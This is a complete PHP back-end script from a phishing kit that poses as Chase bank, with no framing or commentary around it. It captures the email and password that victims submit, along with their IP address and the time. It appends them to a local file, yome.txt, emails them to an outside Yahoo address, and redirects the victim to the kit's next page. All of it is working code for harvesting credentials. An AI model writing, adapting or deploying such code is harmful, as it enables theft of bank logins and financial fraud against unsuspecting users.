<?php

$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "========== Chase ========\n";
$message .= "Email: ".$_POST['eml']."\n";
$message .= "Password: ".$_POST['eps']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "raymondarmstrong788@yahoo.com";
$subject = "New chase | $ip";
$headers = "From: chase";
$file = fopen("yome.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: surf4.php");


?>